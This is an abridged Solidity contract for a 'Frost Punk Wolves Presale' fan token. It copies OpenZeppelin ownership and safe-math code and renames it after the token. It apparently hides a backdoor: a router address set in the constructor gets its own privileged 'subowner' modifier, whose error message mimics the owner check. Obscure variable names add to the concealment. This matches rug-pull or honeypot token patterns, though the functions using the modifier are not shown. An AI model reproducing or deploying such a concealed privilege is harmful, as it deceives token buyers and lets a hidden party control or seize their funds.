...
/// https://x.com/FrostPunkWolvesPresale


pragma solidity 0.8.29;

// FrostPunkWolvesPresale fan token

interface FrostPunkWolvesPresaleinterface {
  /**
...
/*
 * @dev Provides information about the current execution FrostPunkWolvesPresale20Burnable, including the
 ...
 */
abstract contract FrostPunkWolvesPresale20Burnable {
...
// File: @openzeppelin/contracts/access/FrostPunkWolvesPresale20Ownable.sol
 ...
 * the owner.
 */
abstract contract FrostPunkWolvesPresale20Ownable is FrostPunkWolvesPresale20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "FrostPunkWolvesPresale20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "FrostPunkWolvesPresale20Ownable: new owner is the zero address");
 ...
 * `SafeFrostPunkWolvesPresale` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeFrostPunkWolvesPresale {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeFrostPunkWolvesPresale: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeFrostPunkWolvesPresale: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeFrostPunkWolvesPresale: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeFrostPunkWolvesPresale: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeFrostPunkWolvesPresale: modulo by zero");
  }
...
contract FrostPunkWolvesPresaleToken is FrostPunkWolvesPresale20Burnable, FrostPunkWolvesPresaleinterface, FrostPunkWolvesPresale20Ownable {
    
    using SafeFrostPunkWolvesPresale for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Frost Punk Wolves Presale";
        _symbol = "Frost Punk Wolves Presale";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {FrostPunkWolvesPresaleinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {FrostPunkWolvesPresaleinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "FrostPunkWolvesPresale20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {FrostPunkWolvesPresaleinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {FrostPunkWolvesPresaleinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {FrostPunkWolvesPresaleinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {FrostPunkWolvesPresaleinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {FrostPunkWolvesPresaleinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "FrostPunkWolvesPresaleinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {FrostPunkWolvesPresaleinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "FrostPunkWolvesPresaleinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "FrostPunkWolvesPresaleinterface: transfer from the zero address");
        require(shippingto != address(0), "FrostPunkWolvesPresaleinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "FrostPunkWolvesPresaleinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "FrostPunkWolvesPresaleinterface: approve from the zero address");
        require(transporteur != address(0), "FrostPunkWolvesPresaleinterface: approve to the zero address");
